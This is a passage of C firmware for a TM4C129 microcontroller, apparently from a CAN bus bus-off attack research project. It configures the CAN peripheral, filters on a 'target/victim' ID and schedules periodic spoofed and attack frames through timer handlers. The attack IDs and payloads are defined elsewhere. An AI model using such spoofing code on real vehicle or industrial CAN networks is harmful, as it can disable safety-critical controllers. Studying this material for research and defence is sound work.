Ipsitakoley/tm4c129-canbus/busoff/2-interfaces/timers.c
    if ( count % 200 == 0 ) {
        CANMessageSet(CAN0_BASE, TXOBJECT, &g_sCAN0TxMessage,
                  MSG_OBJ_TYPE_TX);

        HWREGBITW(&g_ui32Flags, 0) ^= 1;
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_0, g_ui32Flags);
    }
}


void
spoof_messages_1(int count)
{
     if ( count % 2 == 0 ) {
         CANMessageSet(CAN0_BASE, TXSPOOFOBJECT1_10, &g_sCAN0TxMessageSpoof1_10,
                   MSG_OBJ_TYPE_TX);
     }

     if ( count % 20 == 0 ) {
          CANMessageSet(CAN0_BASE, TXSPOOFOBJECT1_100, &g_sCAN0TxMessageSpoof1_100,
                    MSG_OBJ_TYPE_TX);
     }

     if ( count % 200 == 0 ) {
         CANMessageSet(CAN0_BASE, TXSPOOFOBJECT1_1000, &g_sCAN0TxMessageSpoof1_1000,
                       MSG_OBJ_TYPE_TX);
     }

}

void spoof_messages_2(int count)
{
    CANMessageSet(CAN0_BASE, TXSPOOFOBJECT2_5, &g_sCAN0TxMessageSpoof2_5,
                  MSG_OBJ_TYPE_TX);
    if ( count % 2 == 0 ) {
        CANMessageSet(CAN0_BASE, TXSPOOFOBJECT2_10, &g_sCAN0TxMessageSpoof2_10,
                  MSG_OBJ_TYPE_TX);
    }
}

void
Timer0IntHandler(void)
{

    if (g_sync == 2) {
        TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL); /* Fixup period */
        g_sync = 0;
        g_parity = g_ui32TXCount % 2;
    }

    //
    // Clear the timer interrupt.
    //
    ROM_TimerIntClear(TIMER0_BASE, TIMER_TIMA_TIMEOUT);

    g_tick = true;

    //
    // Update the interrupt status.
    //
#if 0
    ROM_IntMasterDisable();
    ROM_IntMasterEnable();
#endif
}

void
Timer1IntHandler(void)
{
    //uint32_t count;

    ROM_TimerIntClear(TIMER1_BASE, TIMER_TIMA_TIMEOUT);

    TimerEnable(TIMER0_BASE, TIMER_A);
#if 0
    if ( g_ui32RXCount == 0 ) {
        TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL); /* Fixup period */
    }

    count = ++g_ui32RXCount;
    send_messages(count);
#endif


    //
    // Update the interrupt status.
    //
#if 0
    ROM_IntMasterDisable();
    ROM_IntMasterEnable();
#endif
}

void
InitCAN0(void)
{
    //
    // For this example CAN0 is used with RX and TX pins on port A0 and A1.
    // GPIO port A needs to be enabled so these pins can be used.
    //
    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOA);

    //
    // Configure the GPIO pin muxing to select CAN0 functions for these pins.
    // This step selects which alternate function is available for these pins.
    //
    GPIOPinConfigure(GPIO_PA0_CAN0RX);
    GPIOPinConfigure(GPIO_PA1_CAN0TX);

    //
    // Enable the alternate function on the GPIO pins.  The above step selects
    // which alternate function is available.  This step actually enables the
    // alternate function instead of GPIO for these pins.
    //
    GPIOPinTypeCAN(GPIO_PORTA_BASE, GPIO_PIN_0 | GPIO_PIN_1);

    //
    // The GPIO port and pins have been set up for CAN.  The CAN peripheral
    // must be enabled.
    //
    SysCtlPeripheralEnable(SYSCTL_PERIPH_CAN0);

    //
    // Initialize the CAN controller
    //
    CANInit(CAN0_BASE);

    //CANRetrySet(CAN0_BASE, false);

    //
    // Set up the bit rate for the CAN bus.  This function sets up the CAN
    // bus timing for a nominal configuration.  You can achieve more control
    // over the CAN bus timing by using the function CANBitTimingSet() instead
    // of this one, if needed.
    // In this example, the CAN bus is set to 125 kHz.
    //
    CANBitRateSet(CAN0_BASE, g_ui32SysClock, BITRATE);

    //
    // Enable interrupts on the CAN peripheral.  This example uses static
    // allocation of interrupt handlers which means the name of the handler
    // is in the vector table of startup code.
    //
    CANIntEnable(CAN0_BASE, CAN_INT_MASTER | CAN_INT_ERROR | CAN_INT_STATUS);

    //
    // Enable the CAN interrupt on the processor (NVIC).
    //
    IntEnable(INT_CAN0);

#if 0
    // Loopback Test
    HWREG(CAN0_BASE + CAN_O_CTL) |= CAN_CTL_TEST;
    HWREG(CAN0_BASE + CAN_O_TST) |= CAN_TST_LBACK;
#endif

    //
    // Enable the CAN for operation.
    //
    CANEnable(CAN0_BASE);

    //
    // Initialize a message object to be used for receiving CAN messages with
    // any CAN ID.  In order to receive any CAN ID, the ID and mask must both
    // be set to 0, and the ID filter enabled.
    //
    g_sCAN0RxMessage.ui32MsgID = ATK1_ID; // Only accept target/victim ID
    g_sCAN0RxMessage.ui32MsgIDMask = 0x7FF;
    g_sCAN0RxMessage.ui32Flags = MSG_OBJ_RX_INT_ENABLE | MSG_OBJ_USE_ID_FILTER;
    g_sCAN0RxMessage.ui32MsgLen = sizeof(g_ui8RXMsgData);

    CANMessageSet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, MSG_OBJ_TYPE_RX);

    /* TX Objects */
    g_ui8TXMsgData = 0;
    g_sCAN0TxMessage.ui32MsgID = 0xD0;
    g_sCAN0TxMessage.ui32MsgIDMask = 0;
    g_sCAN0TxMessage.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE; // TODO: disable interrupts?
    g_sCAN0TxMessage.ui32MsgLen = sizeof(g_ui8TXMsgData);
    g_sCAN0TxMessage.pui8MsgData = (uint8_t *)&g_ui8TXMsgData;

    g_ui8TXMsgDataHigh[0] = 0;
    g_sCAN0TxMessageHigh.ui32MsgID = 0xA0;
    g_sCAN0TxMessageHigh.ui32MsgIDMask = 0;
    g_sCAN0TxMessageHigh.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageHigh.ui32MsgLen = sizeof(g_ui8TXMsgDataHigh);
    g_sCAN0TxMessageHigh.pui8MsgData = (uint8_t *)&g_ui8TXMsgDataHigh;

    g_sCAN0TxMessageMid.ui32MsgID = 0xB0;
    g_sCAN0TxMessageMid.ui32MsgIDMask = 0;
    g_sCAN0TxMessageMid.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageMid.ui32MsgLen = sizeof(g_ui8TXMsgDataMid);
    g_sCAN0TxMessageMid.pui8MsgData = (uint8_t *)&g_ui8TXMsgDataMid;

    g_sCAN0TxMessageAttack1_10.ui32MsgID = ATK1_ID;
    g_sCAN0TxMessageAttack1_10.ui32MsgIDMask = 0;
    g_sCAN0TxMessageAttack1_10.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageAttack1_10.ui32MsgLen = ATK1_LEN;
    g_sCAN0TxMessageAttack1_10.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataAttack1;

    g_sCAN0TxMessageSpoof1_10.ui32MsgID = SPOOFID1_10;
    g_sCAN0TxMessageSpoof1_10.ui32MsgIDMask = 0;
    g_sCAN0TxMessageSpoof1_10.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageSpoof1_10.ui32MsgLen = SPOOFID1_10_LEN;
    g_sCAN0TxMessageSpoof1_10.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataSpoof1_10;

    g_sCAN0TxMessageSpoof1_100.ui32MsgID = SPOOFID1_100;
    g_sCAN0TxMessageSpoof1_100.ui32MsgIDMask = 0;
    g_sCAN0TxMessageSpoof1_100.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageSpoof1_100.ui32MsgLen = SPOOFID1_100_LEN;
    g_sCAN0TxMessageSpoof1_100.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataSpoof1_100;

    g_sCAN0TxMessageSpoof1_1000.ui32MsgID = SPOOFID1_1000;
    g_sCAN0TxMessageSpoof1_1000.ui32MsgIDMask = 0;
    g_sCAN0TxMessageSpoof1_1000.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageSpoof1_1000.ui32MsgLen = SPOOFID1_1000_LEN;
    g_sCAN0TxMessageSpoof1_1000.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataSpoof1_1000;

    g_sCAN0TxMessageSpoof2_5.ui32MsgID = SPOOFID2_5;
    g_sCAN0TxMessageSpoof2_5.ui32MsgIDMask = 0;
    g_sCAN0TxMessageSpoof2_5.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageSpoof2_5.ui32MsgLen = SPOOFID2_5_LEN;
    g_sCAN0TxMessageSpoof2_5.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataSpoof2_5;

    g_sCAN0TxMessageSpoof2_10.ui32MsgID = SPOOFID2_10;
    g_sCAN0TxMessageSpoof2_10.ui32MsgIDMask = 0;
    g_sCAN0TxMessageSpoof2_10.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageSpoof2_10.ui32MsgLen = SPOOFID2_10_LEN;
    g_sCAN0TxMessageSpoof2_10.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataSpoof2_10;

